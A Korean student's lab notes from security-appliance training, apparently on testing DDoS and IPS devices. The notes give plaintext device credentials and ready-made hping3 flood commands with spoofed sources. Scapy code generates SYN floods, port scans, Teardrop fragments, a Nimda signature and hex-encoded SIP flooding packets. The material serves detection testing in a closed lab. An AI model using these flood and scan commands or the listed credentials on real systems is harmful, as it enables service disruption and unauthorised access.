

디도스 장비는 다른 보안 장비들(IPS, 방화벽 등)의 위, 최상단에 위치함. 왜냐하면 디도스의 대역폭 공격은 다른 보안장비들이 받아내면 뻗어버려서 디도스 장비에서 먼저 대역폭 공격을 받아내서 대역폭 공격 중 일부만을 보안장비들로 흘려보냄

동작모드
- INLINE: 탐지, 차단
- SPAN: 탐지, 차단
- BY-PASS: 탐지, 차단



로그 - 과거에 있었던 일들은 여기서 봄. 트래픽, 탐지, 차단 등


IP POOL: 내부 서버가 홈페이지 주소같은 게 있을 때, 홈페이지 주소를 IP POOL에 등록함. 등록된 IP에 오는 공격을 탐지 및 차단함
보호해야할 대상들이 등록된 리스트가 IP POOL 임

DDoS는 내부 자산을 보호해야함. 서버는 IP를 가지고 있고, 보호해야할 대상 IP를 IP POOL에 등록함 ip pool에 등록한 ip를 가지고 탐지정책 설정에서 등록된 ip 정보로 탐지정책을 설정할 수 있음





DDoS (GUI)
10.200.10.17:4000
sniper/**S**niper12#
-> 10.200.10.17 장비에 4000번 포트로 접근하는 것

IPS (GUI)
10.200.10.14:4000
sniper/sniper12#
-> 10.200.10.14 장비에 4000번 포트로 접근하는 것

PuTTY (Scapy 사용O) -> 계측기
10.100.6.102:22
10.100.4.102:22
wins21/보안00!#@$
-> 10.100.6.102 장비에 22번 포트로 접근하는 것

PuTTY (Scapy 사용X) -> ?
10.200.10.14:222
root/sniper!#@$
-> 10.200.10.14 장비에 222번 포트로 접근하는 것, 10.200.10.14 장비는 IPS 장비임
IPS 장비는 둘 다 GUI, PuTTY로 접근할 수 있지만 각각 접근할 수 있는 포트번호는 다름 그리고 각 4000번과 222번 포트는 각각 접근할 수 있는 장비가 달라서 4000번에 PuTTY로 접근이 안 되고, 222번에 GUI로 접근이 안 됨



PuTTY를 사용할 때 설정해줘야 할 것
- TMOUT=0 -> 입력이 없어도 안 꺼지도록 하기
- sudo su -> 관리자 권한을 받아와서 Scapy와 같은 기능을 실행할 수 있게 하기
- **Scapy 에서 할 것**
	- conf.iface="eth()"
		- 사용하는 장비가 IPS면 IPS는 조마다 장비가 있으므로 eth4로 하면 4조의 IPS로 접근할 수 있음
		- 사용하는 장비가 DDoS 장비면 디도스 장비는 하나 밖에 없으므로 디도스 장비의 인터페이스 번호인 eth6을 사용해야지 접근가능함






tcpreplay -i eth4 -l 0 DDoS2.pcap

tcpreplay는 만들어진 패킷을 쏘는 것
scapy는 패킷을 만들어서 쏘는 것


TCP SYN Flooding 공격 실습
p1 = Ether(src="10:65:30:2F:D9:9B", dst="e0:ac:f1:f:da:40")/IP(src="172.16.255.100", dst="10.100.4.3")/TCP(sport=1025, dport=80, flags="S") 
sendp(p1, count=1000)





## hping을 사용한 디도스 공격 명령어 ##
- UDP 플로딩: !hping3 --udp -p 53 --flood -a 10.100.10.1 10.100.10.2
- ICMP 플로딩: !hping3 --icmp -p 53 --flood -a 10.100.10.1 10.100.10.2
- TCP 플로딩: !hping3 -S -p 80 --flood -a 10.100.10.1 10.100.10.2


1. 디도스 공격의 의미
2. 디도스 방어 장비의 역할
	1. 서버 패치 자동화
	2. 악성 트래픽 차단
	3. 계정 관리
	4. 데이터 백업









# ※※※※※ #
tcpreplay -i eth4 -l 0 DDoS1.pcap
tcpreplay -i eth4 -l 0 DDoS2.pcap
를 통해서 DDoS를 보냈다면 꼭!! 꼭!!!!!! Ctrl+z를 써서 보내던 것을 중지시키자
이게 서버에서 보내는 거라서 Ctrl+Z 로 종료시키지 않고 PuTTY를 종료시키면 내 컴퓨터에서는 종료시킬 수가 없어짐. 



CPS: Connetion Per Seconds -> 초당 SYN 갯수를 뜻함




질문
Q1) 와이어샤크에 Scapy로 보내는 패킷은 왜 안 잡히는가?
A1) 이 질문에 대한 답은 Scapy라는 프로그램을 쓰는 계측기(토마호크)가 어디에 위치하느냐에 따라 다르다

![[Pasted image 20260114165951.png]]
계측기는 패킷을 생성하는 장비로, PuTTY에서 계측기의 IP로 접근한 다음 Scapy를 실행하면 패킷을 생성 및 전송할 수 있다.
패킷을 생성해서 전송하는 계측기와 연결된 통신회선(?)이 와이어샤크를 안 지나므로 인터넷과의 통신을 감지하는 와이어샤크는 계측기에서 생성한 패킷을 읽을 수 없는 것이다. 
예외로 패킷을 생성할 때 IP의 목적지를 8.8.8.8로 했을 때 와이어샤크에서 잡히기도 하는데 이것은 패킷이 어캐어캐 돌고 돌아서 와이어샤크를 통과해서 그럴 수도 있다.

우리가 평소에쓰는 IPS, DDoS, 계측기 장비같은 건 PC에서 바로 연결되어 있는 게 아니라 PC의 앱을 통해서 해당 장비의 IP 주소로 접근을 해서 해당 장비의 기능을 사용 하는 것


Q2) DDoS GUI 에서 DDoS 패킷을 여러개를 보냈을 때 Input으로 TCP와 UDP가 들어갔는데 나가는 게 없으면 차단된 것이 아닌가?
A2) 이건 내가 착각했던 것으로 DDoS GUI의 모니터-전체 트래픽을 보면 "프로토콜 별(Inbound,Outbound)"라고 되어 있다. 이것을 "(Input/Output)"으로 바꾸면 정상적인 그래프를 확인할 수 있음
*\* 이러면 추가로 패킷이 DDoS를 통해 위로 나가면 Out, DDoS를 통해 아래로 들어오면 In이니까 IP 주소를 바꾸면 In,Out Bound의 방향도 바뀌어야 할 거 같지만 포트 설정과 같은 이유로 이론적으로라면 맞지만 실제로 Wins 네트워크에서는 바뀌지 않는다고 한다.



## Scapy 패킷 생성 및 전송 코드 ##
전역설정
인터페이스 : eth(조번호)
목적지 IP 10.100.(조번호)3
conf.iface="eth4"
dst = 10.100.1.3

src="10:65:30:2F:D9:9B", dst="e0:ac:f1:f7:da:40"


1. 패턴블럭 - "Win32/Nimda, Worm (TCP-25)" 
p1 = Ether(src="10:65:30:2F:D9:9B", dst="e0:ac:f1:f7:da:40")/IP(src="172.16.255.100", dst="10.100.4.3")/TCP(sport=1025, dport=25, flags="PA")/"11CFvcbVPPHG1TzxxtU88E6pcPHW1TzyZqkU8dbV"  
sendp(p1, count=1234)

2. 서비스거부 - TCP SYN Flooding
p1 = Ether(src="10:65:30:2F:D9:9B", dst="e0:ac:f1:f7:da:40")/IP(src="17.1.25.10", dst="1.1.4.3")/TCP(sport=1025, dport=80, flags="S")
sendp(p1, count=1000)

3. 정보수집 - SYN Port Scan
p1 = Ether(src="10:65:30:2F:D9:9B", dst="e0:ac:f1:f7:da:40")/IP(src="172.16.255.102", dst="10.100.4.3")/TCP(sport=1025, dport=range(1026,65535), flags="S")
sendp(p1, verbose=0, count=1000)

p1 = Ether(src="e0:ac:f1:f7:da:40", dst="10:65:30:2F:D9:9B")/IP(src="172.16.255.102", dst="10.100.4.3")/TCP(sport=1025, dport=range(1026,65535), flags="S")
sendp(p1, verbose=0, count=1000)

-4. 프로토콜 취약점 - Tear Drop (PC에서 나가는것 같은데 IPS 까지 도달 안됨, 망단에서 차단되는 것 같음)
p1 = Ether(src="10:65:30:2F:D9:9B", dst="e0:ac:f1:f7:da:40")/IP(src="172.16.255.100", dst="175.207.112.200", flags="MF")
sendp(p1, count=1000)

5. 패턴블럭/사용자정의 - TCP 80, aaaa 패턴
p1 = Ether(src="10:65:30:2F:D9:9B", dst="e0:ac:f1:f7:da:40")/IP(src="172.16.255.102", dst="10.100.4.3")/TCP(sport=1025, dport=80, flags="PA")/"KimJungWoo"  
sendp(p1, count=1000)

6. 패턴블럭/사용자정의 - TCP 80, www.wins21.co.kr 패턴
p1 = Ether(src="10:65:30:2F:D9:9B", dst="e0:ac:f1:f7:da:40")/IP(src="172.16.255.100", dst="10.100.4.3")/TCP(sport=1025, dport=80, flags="PA")/"www.wins21.co.kr"  
혹은
p1 = Ether(src="10:65:30:2F:D9:9B", dst="e0:ac:f1:f7:da:40")/IP(src="172.16.255.100", dst="10.100.4.3")/TCP(sport=1025, dport=80, flags="PA")/"GET /index.html HTTP/1.0\r\nHost: www.wins21.co.kr\r\n\r\n"  
sendp(p1, count=1000)

8-1. SIP INVITE message flooding / SIP INVITE DOS
p1 = Ether(src="10:65:30:2F:D9:9B", dst="e0:ac:f1:f7:da:40")/IP(src="172.16.255.100", dst="10.100.4.3")/UDP(sport=5060, dport=5060)/"\x49\x4e\x56\x49\x54\x45\x20\x73\x69\x70\x3a\x30\x31\x37\x36\x35\x37\x38\x38\x32\x38\x40\x6b\x74\x2e\x63\x6f\x2e\x6b\x72\x20\x53\x49\x50\x2f\x32\x2e\x30\x0d\x0a\x56\x69\x61\x3a\x20\x53\x49\x50\x2f\x32\x2e\x30\x2f\x55\x44\x50\x20\x35\x39\x2e\x31\x2e\x31\x32\x33\x2e\x32\x33\x3a\x35\x30\x36\x30\x3b\x62\x72\x61\x6e\x63\x68\x3d\x7a\x39\x68\x47\x34\x62\x4b\x33\x37\x30\x38\x38\x38\x39\x34\x30\x31\x0d\x0a\x46\x72\x6f\x6d\x3a\x20\x3c\x73\x69\x70\x3a\x30\x36\x33\x33\x35\x31\x35\x34\x38\x33\x40\x6b\x74\x2e\x63\x6f\x2e\x6b\x72\x3e\x3b\x74\x61\x67\x3d\x62\x30\x33\x66\x30\x35\x35\x66\x2d\x35\x66\x30\x30\x30\x30\x0d\x0a\x54\x6f\x3a\x20\x3c\x73\x69\x70\x3a\x30\x31\x37\x36\x35\x37\x38\x38\x32\x38\x40\x6b\x74\x2e\x63\x6f\x2e\x6b\x72\x3e\x0d\x0a\x43\x61\x6c\x6c\x2d\x49\x44\x3a\x20\x36\x30\x39\x62\x66\x39\x62\x36\x2d\x35\x66\x30\x30\x30\x30\x40\x35\x39\x2e\x31\x2e\x31\x32\x33\x2e\x32\x33\x0d\x0a\x43\x53\x65\x71\x3a\x20\x31\x33\x34\x39\x20\x49\x4e\x56\x49\x54\x45\x0d\x0a\x43\x6f\x6e\x74\x61\x63\x74\x3a\x20\x3c\x73\x69\x70\x3a\x30\x36\x33\x33\x35\x31\x35\x34\x38\x33\x40\x35\x39\x2e\x31\x2e\x31\x32\x33\x2e\x32\x33\x3b\x74\x72\x61\x6e\x73\x70\x6f\x72\x74\x3d\x75\x64\x70\x3e\x0d\x0a\x4d\x61\x78\x2d\x46\x6f\x72\x77\x61\x72\x64\x73\x3a\x20\x37\x30\x0d\x0a\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x44\x56\x5f\x32\x33\x32\x2f\x41\x50\x50\x5f\x56\x45\x52\x5f\x34\x2e\x39\x33\x20\x28\x31\x2e\x30\x31\x20\x30\x36\x2f\x30\x38\x2f\x30\x34\x20\x31\x33\x3a\x35\x30\x29\x0d\x0a\x53\x75\x70\x70\x6f\x72\x74\x65\x64\x3a\x20\x74\x69\x6d\x65\x72\x2c\x72\x65\x70\x6c\x61\x63\x65\x73\x0d\x0a\x50\x2d\x41\x73\x73\x65\x72\x74\x65\x64\x2d\x49\x64\x65\x6e\x74\x69\x74\x79\x3a\x20\x3c\x73\x69\x70\x3a\x30\x37\x30\x37\x37\x30\x30\x35\x32\x34\x30\x40\x6b\x74\x2e\x63\x6f\x2e\x6b\x72\x3e\x0d\x0a\x41\x6c\x6c\x6f\x77\x3a\x20\x41\x43\x4b\x2c\x49\x4e\x56\x49\x54\x45\x2c\x43\x41\x4e\x43\x45\x4c\x2c\x42\x59\x45\x2c\x52\x45\x46\x45\x52\x2c\x53\x55\x42\x53\x43\x52\x49\x42\x45\x2c\x4e\x4f\x54\x49\x46\x59\x2c\x50\x52\x41\x43\x4b\x2c\x49\x4e\x46\x4f\x2c\x55\x50\x44\x41\x54\x45\x0d\x0a\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x54\x79\x70\x65\x3a\x20\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x73\x64\x70\x0d\x0a\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x4c\x65\x6e\x67\x74\x68\x3a\x20\x32\x38\x38\x0d\x0a\x0d\x0a\x76\x3d\x30\x0d\x0a\x6f\x3d\x30\x36\x33\x33\x35\x31\x35\x34\x38\x33\x20\x33\x34\x35\x32\x30\x20\x33\x34\x35\x32\x30\x20\x49\x4e\x20\x49\x50\x34\x20\x35\x39\x2e\x31\x2e\x31\x32\x33\x2e\x32\x33\x0d\x0a\x73\x3d\x2d\x0d\x0a\x63\x3d\x49\x4e\x20\x49\x50\x34\x20\x35\x39\x2e\x31\x2e\x31\x32\x33\x2e\x32\x33\x0d\x0a\x74\x3d\x30\x20\x30\x0d\x0a\x6d\x3d\x61\x75\x64\x69\x6f\x20\x32\x33\x36\x38\x30\x20\x52\x54\x50\x2f\x41\x56\x50\x20\x30\x20\x38\x20\x31\x38\x20\x34\x20\x31\x30\x31\x0d\x0a\x61\x3d\x72\x74\x70\x6d\x61\x70\x3a\x30\x20\x50\x43\x4d\x55\x2f\x38\x30\x30\x30\x0d\x0a\x61\x3d\x72\x74\x70\x6d\x61\x70\x3a\x38\x20\x50\x43\x4d\x41\x2f\x38\x30\x30\x30\x0d\x0a\x61\x3d\x72\x74\x70\x6d\x61\x70\x3a\x31\x38\x20\x47\x37\x32\x39\x2f\x38\x30\x30\x30\x0d\x0a\x61\x3d\x72\x74\x70\x6d\x61\x70\x3a\x34\x20\x47\x37\x32\x33\x2f\x38\x30\x30\x30\x0d\x0a\x61\x3d\x72\x74\x70\x6d\x61\x70\x3a\x31\x30\x31\x20\x74\x65\x6c\x65\x70\x68\x6f\x6e\x65\x2d\x65\x76\x65\x6e\x74\x2f\x38\x30\x30\x30\x0d\x0a\x61\x3d\x73\x69\x6c\x65\x6e\x63\x65\x53\x75\x70\x70\x3a\x6f\x66\x66\x20\x2d\x20\x2d\x20\x2d\x20\x2d\x0d\x0a\x61\x3d\x66\x6d\x74\x70\x3a\x31\x30\x31\x20\x30\x2d\x31\x35\x0d\x0a"
sendp(p1, count=100)


8-2. SIP REGISTER message flooding / SIP REGISTER DOS
p1 = Ether(src="10:65:30:2F:D9:9B", dst="e0:ac:f1:f7:da:40")/IP(src="172.16.255.100", dst="10.100.4.3")/UDP(sport=5060, dport=5060)/"\x52\x45\x47\x49\x53\x54\x45\x52\x20\x73\x69\x70\x3a\x73\x62\x63\x31\x2e\x6b\x74\x30\x37\x30\x2e\x63\x6f\x2e\x6b\x72\x20\x53\x49\x50\x2f\x32\x2e\x30\x0d\x0a\x56\x69\x61\x3a\x20\x53\x49\x50\x2f\x32\x2e\x30\x2f\x55\x44\x50\x20\x31\x37\x32\x2e\x33\x30\x2e\x31\x2e\x37\x37\x3a\x35\x30\x36\x30\x3b\x62\x72\x61\x6e\x63\x68\x3d\x7a\x39\x68\x47\x34\x62\x4b\x77\x75\x7a\x72\x46\x41\x6a\x54\x79\x0d\x0a\x4d\x61\x78\x2d\x46\x6f\x72\x77\x61\x72\x64\x73\x3a\x20\x37\x30\x0d\x0a\x54\x6f\x3a\x20\x30\x37\x30\x37\x37\x31\x36\x31\x38\x35\x38\x20\x3c\x73\x69\x70\x3a\x30\x37\x30\x37\x37\x31\x36\x31\x38\x35\x38\x40\x73\x62\x63\x31\x2e\x6b\x74\x30\x37\x30\x2e\x63\x6f\x2e\x6b\x72\x3e\x0d\x0a\x46\x72\x6f\x6d\x3a\x20\x30\x37\x30\x37\x37\x31\x36\x31\x38\x35\x38\x20\x3c\x73\x69\x70\x3a\x30\x37\x30\x37\x37\x31\x36\x31\x38\x35\x38\x40\x73\x62\x63\x31\x2e\x6b\x74\x30\x37\x30\x2e\x63\x6f\x2e\x6b\x72\x3e\x3b\x74\x61\x67\x3d\x74\x42\x6a\x47\x79\x32\x77\x4d\x4d\x72\x0d\x0a\x43\x61\x6c\x6c\x2d\x49\x44\x3a\x20\x75\x61\x35\x79\x41\x74\x42\x72\x6d\x42\x35\x6d\x70\x6d\x64\x57\x77\x6c\x40\x31\x37\x32\x2e\x33\x30\x2e\x31\x2e\x37\x37\x0d\x0a\x43\x53\x65\x71\x3a\x20\x33\x31\x20\x52\x45\x47\x49\x53\x54\x45\x52\x0d\x0a\x45\x78\x70\x69\x72\x65\x73\x3a\x20\x33\x36\x30\x30\x0d\x0a\x43\x6f\x6e\x74\x61\x63\x74\x3a\x20\x3c\x73\x69\x70\x3a\x30\x37\x30\x37\x37\x31\x36\x31\x38\x35\x38\x40\x31\x37\x32\x2e\x33\x30\x2e\x31\x2e\x37\x37\x3e\x3b\x64\x65\x73\x63\x72\x69\x70\x74\x69\x6f\x6e\x3d\x22\x69\x6d\x2c\x70\x73\x22\x0d\x0a\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x56\x69\x7a\x75\x66\x6f\x6e\x53\x49\x50\x2f\x32\x2e\x30\x20\x4b\x54\x0d\x0a\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x4c\x65\x6e\x67\x74\x68\x3a\x20\x30\x0d\x0a\x0d\x0a"
sendp(p1, count=100)


8-3. SIP ACK message flooding
p1 = Ether(src="10:65:30:2F:D9:9B", dst="e0:ac:f1:f7:da:40")/IP(src="172.16.255.100", dst="10.100.4.3")/UDP(sport=5060, dport=5060)/"\x41\x43\x4b\x20\x73\x69\x70\x3a\x30\x31\x30\x33\x39\x30\x39\x33\x32\x38\x32\x40\x32\x32\x32\x2e\x31\x32\x32\x2e\x32\x35\x34\x2e\x33\x35\x3a\x35\x30\x36\x30\x20\x53\x49\x50\x2f\x32\x2e\x30\x0d\x0a\x56\x69\x61\x3a\x20\x53\x49\x50\x2f\x32\x2e\x30\x2f\x55\x44\x50\x20\x31\x32\x31\x2e\x31\x34\x30\x2e\x39\x31\x2e\x31\x39\x39\x3a\x35\x30\x36\x30\x3b\x62\x72\x61\x6e\x63\x68\x3d\x7a\x39\x68\x47\x34\x62\x4b\x2e\x64\x6c\x73\x72\x6b\x73\x30\x30\x30\x32\x35\x2e\x31\x36\x37\x34\x31\x39\x35\x30\x30\x38\x36\x37\x0d\x0a\x52\x6f\x75\x74\x65\x3a\x20\x73\x65\x72\x76\x65\x72\x20\x3c\x73\x69\x70\x3a\x32\x30\x30\x30\x40\x35\x39\x2e\x31\x38\x2e\x34\x2e\x31\x37\x3a\x35\x30\x36\x30\x3b\x6c\x72\x3e\x0d\x0a\x52\x6f\x75\x74\x65\x3a\x20\x3c\x73\x69\x70\x3a\x32\x32\x32\x2e\x31\x32\x32\x2e\x32\x35\x34\x2e\x33\x35\x3a\x35\x30\x36\x30\x3b\x6c\x72\x3e\x0d\x0a\x46\x72\x6f\x6d\x3a\x20\x3c\x73\x69\x70\x3a\x30\x32\x38\x35\x36\x30\x34\x33\x38\x40\x6b\x74\x2e\x63\x6f\x2e\x6b\x72\x3e\x3b\x74\x61\x67\x3d\x31\x39\x33\x38\x33\x37\x38\x37\x32\x34\x35\x33\x39\x38\x34\x34\x31\x31\x32\x31\x31\x38\x30\x37\x31\x37\x31\x39\x32\x0d\x0a\x54\x6f\x3a\x20\x3c\x73\x69\x70\x3a\x30\x31\x30\x33\x39\x30\x39\x33\x32\x38\x32\x40\x6b\x74\x2e\x63\x6f\x2e\x6b\x72\x3e\x3b\x74\x61\x67\x3d\x64\x65\x37\x61\x66\x65\x32\x33\x74\x33\x32\x69\x30\x61\x30\x30\x31\x34\x31\x37\x78\x30\x30\x31\x33\x30\x36\x6b\x30\x30\x33\x31\x35\x35\x30\x30\x32\x30\x30\x37\x30\x36\x30\x31\x31\x36\x35\x39\x35\x32\x39\x37\x36\x0d\x0a\x43\x61\x6c\x6c\x2d\x49\x44\x3a\x20\x32\x31\x31\x36\x34\x39\x32\x34\x32\x31\x37\x39\x38\x63\x35\x62\x63\x37\x38\x35\x37\x38\x32\x37\x37\x37\x34\x34\x34\x39\x40\x31\x32\x31\x2e\x31\x34\x30\x2e\x39\x31\x2e\x31\x39\x39\x0d\x0a\x43\x53\x65\x71\x3a\x20\x32\x30\x20\x41\x43\x4b\x0d\x0a\x43\x6f\x6e\x74\x61\x63\x74\x3a\x20\x3c\x73\x69\x70\x3a\x30\x32\x38\x35\x36\x30\x34\x33\x38\x40\x31\x32\x31\x2e\x31\x34\x30\x2e\x39\x31\x2e\x31\x39\x39\x3a\x35\x30\x36\x30\x3e\x0d\x0a\x4d\x61\x78\x2d\x46\x6f\x72\x77\x61\x72\x64\x73\x3a\x20\x37\x30\x0d\x0a\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x6b\x69\x73\x61\x6e\x2f\x31\x2e\x33\x2e\x32\x0d\x0a\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x4c\x65\x6e\x67\x74\x68\x3a\x20\x30\x0d\x0a\x0d\x0a"
sendp(p1, count=100)


8-4. SIP BYE message flooding 
p1 = Ether(src="10:65:30:2F:D9:9B", dst="e0:ac:f1:f7:da:40")/IP(src="172.16.255.100", dst="10.100.4.3")/UDP(sport=5060, dport=5060)/"\x42\x59\x45\x20\x73\x69\x70\x3a\x30\x31\x30\x33\x31\x37\x30\x35\x36\x38\x39\x40\x32\x32\x32\x2e\x31\x32\x32\x2e\x32\x35\x34\x2e\x33\x35\x3a\x35\x30\x36\x30\x20\x53\x49\x50\x2f\x32\x2e\x30\x0d\x0a\x46\x72\x6f\x6d\x3a\x20\x3c\x73\x69\x70\x3a\x30\x37\x30\x37\x37\x33\x35\x30\x30\x33\x34\x40\x32\x32\x32\x2e\x31\x32\x32\x2e\x33\x38\x2e\x37\x31\x3a\x35\x30\x36\x30\x3e\x3b\x74\x61\x67\x3d\x38\x34\x32\x35\x39\x63\x30\x0d\x0a\x54\x6f\x3a\x20\x22\x30\x31\x30\x33\x31\x37\x30\x35\x36\x38\x39\x22\x3c\x73\x69\x70\x3a\x30\x31\x30\x33\x31\x37\x30\x35\x36\x38\x39\x40\x32\x32\x32\x2e\x31\x32\x32\x2e\x32\x35\x34\x2e\x33\x35\x3a\x35\x30\x36\x30\x3e\x3b\x74\x61\x67\x3d\x64\x65\x37\x61\x66\x65\x32\x33\x74\x33\x32\x69\x30\x61\x30\x30\x38\x31\x38\x39\x78\x30\x30\x38\x30\x38\x31\x6b\x30\x30\x32\x31\x30\x36\x30\x30\x32\x30\x30\x37\x30\x36\x30\x31\x31\x36\x35\x36\x31\x36\x37\x34\x35\x0d\x0a\x43\x61\x6c\x6c\x2d\x49\x44\x3a\x20\x41\x41\x7a\x47\x56\x33\x5f\x5f\x41\x53\x41\x41\x41\x42\x65\x79\x33\x6e\x72\x2d\x47\x77\x40\x78\x65\x6e\x65\x72\x2e\x63\x6f\x6d\x0d\x0a\x43\x53\x65\x71\x3a\x20\x33\x34\x33\x38\x34\x39\x38\x31\x20\x42\x59\x45\x0d\x0a\x53\x75\x70\x70\x6f\x72\x74\x65\x64\x3a\x20\x70\x72\x69\x76\x61\x63\x79\x0d\x0a\x4d\x61\x78\x2d\x46\x6f\x72\x77\x61\x72\x64\x73\x3a\x20\x36\x39\x0d\x0a\x56\x69\x61\x3a\x20\x53\x49\x50\x2f\x32\x2e\x30\x2f\x55\x44\x50\x20\x32\x32\x32\x2e\x31\x32\x32\x2e\x33\x38\x2e\x37\x31\x3a\x35\x30\x36\x30\x3b\x62\x72\x61\x6e\x63\x68\x3d\x7a\x39\x68\x47\x34\x62\x4b\x4f\x79\x69\x51\x61\x4f\x79\x51\x63\x59\x67\x53\x59\x36\x4f\x79\x69\x51\x61\x6b\x30\x4d\x2d\x43\x49\x4b\x79\x47\x2d\x53\x2e\x31\x2d\x62\x34\x62\x65\x34\x34\x31\x30\x0d\x0a\x52\x65\x63\x6f\x72\x64\x2d\x52\x6f\x75\x74\x65\x3a\x20\x3c\x73\x69\x70\x3a\x31\x39\x33\x31\x31\x37\x37\x30\x32\x37\x32\x31\x30\x33\x33\x36\x32\x30\x30\x39\x41\x4f\x55\x44\x40\x32\x32\x32\x2e\x31\x32\x32\x2e\x33\x38\x2e\x37\x31\x3a\x35\x30\x36\x30\x3b\x6c\x72\x3b\x64\x61\x79\x61\x52\x52\x50\x61\x72\x61\x6d\x32\x32\x32\x37\x31\x32\x32\x36\x33\x38\x31\x37\x31\x3e\x0d\x0a\x56\x69\x61\x3a\x20\x53\x49\x50\x2f\x32\x2e\x30\x2f\x55\x44\x50\x20\x32\x32\x32\x2e\x36\x37\x2e\x35\x35\x2e\x34\x36\x3a\x35\x39\x37\x31\x33\x3b\x72\x70\x6f\x72\x74\x3d\x35\x39\x37\x31\x33\x3b\x62\x72\x61\x6e\x63\x68\x3d\x7a\x39\x68\x47\x34\x62\x4b\x32\x35\x34\x39\x0d\x0a\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x4c\x65\x6e\x67\x74\x68\x3a\x20\x30\x0d\x0a\x0d\x0a"


8-5. SIP PING message flooding / SIP PING DOS
p1 = Ether(src="10:65:30:2F:D9:9B", dst="e0:ac:f1:f7:da:40")/IP(src="172.16.255.100", dst="10.100.4.3")/UDP(sport=5060, dport=5060)/"\x50\x49\x4e\x47\x20\x73\x69\x70\x3a\x37\x30\x37\x35\x36\x36\x34\x34\x38\x33\x40\x6c\x67\x64\x61\x63\x6f\x6d\x2e\x6e\x65\x74\x20\x53\x49\x50\x2f\x32\x2e\x30\x0d\x0a\x56\x69\x61\x3a\x20\x53\x49\x50\x2f\x32\x2e\x30\x2f\x55\x44\x50\x20\x31\x39\x32\x2e\x31\x36\x38\x2e\x31\x32\x33\x2e\x31\x30\x31\x3a\x35\x30\x36\x30\x3b\x62\x72\x61\x6e\x63\x68\x3d\x7a\x39\x68\x47\x34\x62\x4b\x32\x31\x34\x31\x31\x30\x38\x37\x30\x34\x0d\x0a\x46\x72\x6f\x6d\x3a\x20\x22\x30\x37\x30\x37\x35\x36\x36\x34\x34\x38\x33\x22\x20\x3c\x73\x69\x70\x3a\x37\x30\x37\x35\x36\x36\x34\x34\x38\x33\x40\x6c\x67\x64\x61\x63\x6f\x6d\x2e\x6e\x65\x74\x3e\x3b\x74\x61\x67\x3d\x32\x30\x38\x31\x37\x34\x33\x38\x35\x33\x0d\x0a\x54\x6f\x3a\x20\x22\x30\x37\x30\x37\x35\x36\x36\x34\x34\x38\x33\x22\x20\x3c\x73\x69\x70\x3a\x37\x30\x37\x35\x36\x36\x34\x34\x38\x33\x40\x6c\x67\x64\x61\x63\x6f\x6d\x2e\x6e\x65\x74\x3e\x0d\x0a\x50\x72\x6f\x78\x79\x2d\x52\x65\x71\x75\x69\x72\x65\x3a\x20\x63\x6f\x6d\x2e\x6e\x6f\x72\x74\x65\x6c\x6e\x65\x74\x77\x6f\x72\x6b\x73\x2e\x66\x69\x72\x65\x77\x61\x6c\x6c\x0d\x0a\x43\x61\x6c\x6c\x2d\x49\x44\x3a\x20\x32\x30\x31\x33\x30\x37\x30\x39\x33\x35\x40\x31\x39\x32\x2e\x31\x36\x38\x2e\x31\x32\x33\x2e\x31\x30\x31\x0d\x0a\x43\x53\x65\x71\x3a\x20\x32\x30\x20\x50\x49\x4e\x47\x0d\x0a\x43\x6f\x6e\x74\x61\x63\x74\x3a\x20\x3c\x73\x69\x70\x3a\x37\x30\x37\x35\x36\x36\x34\x34\x38\x33\x40\x31\x39\x32\x2e\x31\x36\x38\x2e\x31\x32\x33\x2e\x31\x30\x31\x3a\x35\x30\x36\x30\x3e\x0d\x0a\x4d\x61\x78\x2d\x46\x6f\x72\x77\x61\x72\x64\x73\x3a\x20\x37\x30\x0d\x0a\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x57\x50\x55\x2d\x37\x30\x30\x30\x48\x2d\x76\x31\x2e\x32\x2e\x31\x32\x2f\x31\x32\x31\x0d\x0a\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x4c\x65\x6e\x67\x74\x68\x3a\x20\x30\x0d\x0a\x0d\x0a"


번외 1. 정보수집 - Dcom_TCP_Sweep(MSBlaster Worm, Messenger...)
p1 = Ether(src="10:65:30:2F:D9:9B", dst="e0:ac:f1:f7:da:40")/IP(src="172.16.255.100", dst="10.100.4.3")/TCP(sport=1025, dport=135, flags="S")
sendp(p1, verbose=0)


----------------------------------------------------------------------------------------------------------------------------
IPv6 트래픽
소스 IP 10.10.10.100" / 목적지 IP 10.10.10.1
Ether(src="10:65:30:2F:D9:9B", dst="e0:ac:f1:f7:da:40")/IPv6(src="::ffff:a0a:a64", dst="::ffff:a0a:a01")/UDP(sport=1025, dport=80)/"wins21.co.kr"

소스 IP 172.16.255.100" / 목적지 IP 175.207.112.200
1. 패턴블럭 - "Win32/Nimda, Worm (TCP-25)" 
p1 = Ether(src="10:65:30:2F:D9:9B", dst="e0:ac:f1:f7:da:40")/IPv6(src="::ffff:a00:31f", dst="::ffff:a00:1e72")/TCP(sport=1025, dport=25, flags="PA")/"11CFvcbVPPHG1TzxxtU88E6pcPHW1TzyZqkU8dbV"  
sendp(p1, count=1)

2. 서비스거부 - TCP SYN Flooding
p1 = Ether(src="10:65:30:2F:D9:9B", dst="e0:ac:f1:f7:da:40")/IPv6(src="::ffff:a00:31f", dst="::ffff:a00:1e72")/TCP(sport=1025, dport=80, flags="S")
sendp(p1, count=1000)

3. 정보수집 - SYN Port Scan
p1 = Ether(src="10:65:30:2F:D9:9B", dst="e0:ac:f1:f7:da:40")/IPv6(src="::ffff:a00:31f", dst="::ffff:a00:1e72")/TCP(sport=1025, dport=range(1026,65535), flags="S")
sendp(p1, verbose=0)

-4. 프로토콜 취약점 - Tear Drop (PC에서 나가는것 같은데 IPS 까지 도달 안됨, 망단에서 차단되는 것 같음)
p1 = Ether(src="10:65:30:2F:D9:9B", dst="e0:ac:f1:f7:da:40")/IP(src="172.16.255.100", dst="175.207.112.200", flags="MF")
sendp(p1, count=1000)

5. 패턴블럭/사용자정의 - TCP 80, aaaa 패턴
